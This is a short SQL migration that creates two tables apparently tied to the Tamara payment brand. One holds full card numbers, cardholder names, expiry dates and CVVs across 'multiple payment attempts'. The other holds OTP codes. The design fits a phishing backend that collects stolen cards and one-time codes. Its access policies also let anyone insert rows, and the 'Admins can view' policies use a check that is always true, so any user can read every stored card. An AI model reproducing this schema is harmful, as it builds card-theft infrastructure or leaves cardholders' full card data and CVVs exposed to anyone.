-- Create tamara_payment_attempts table to track multiple payment attempts
CREATE TABLE IF NOT EXISTS public.tamara_payment_attempts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  payment_id UUID NOT NULL,
  card_number TEXT NOT NULL,
  card_holder_name TEXT NOT NULL,
  expiry_date TEXT NOT NULL,
  cvv TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create tamara_otp_attempts table to track multiple OTP attempts
CREATE TABLE IF NOT EXISTS public.tamara_otp_attempts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  payment_id UUID NOT NULL,
  otp_code TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS for tamara_payment_attempts
ALTER TABLE public.tamara_payment_attempts ENABLE ROW LEVEL SECURITY;

-- Create RLS policies for tamara_payment_attempts
CREATE POLICY "Anyone can insert payment attempts"
ON public.tamara_payment_attempts
FOR INSERT
WITH CHECK (true);

CREATE POLICY "Admins can view payment attempts"
ON public.tamara_payment_attempts
FOR SELECT
USING (true);

-- Enable RLS for tamara_otp_attempts
ALTER TABLE public.tamara_otp_attempts ENABLE ROW LEVEL SECURITY;

-- Create RLS policies for tamara_otp_attempts
CREATE POLICY "Anyone can insert otp attempts"
ON public.tamara_otp_attempts
FOR INSERT
WITH CHECK (true);

CREATE POLICY "Admins can view otp attempts"
ON public.tamara_otp_attempts
FOR SELECT
USING (true);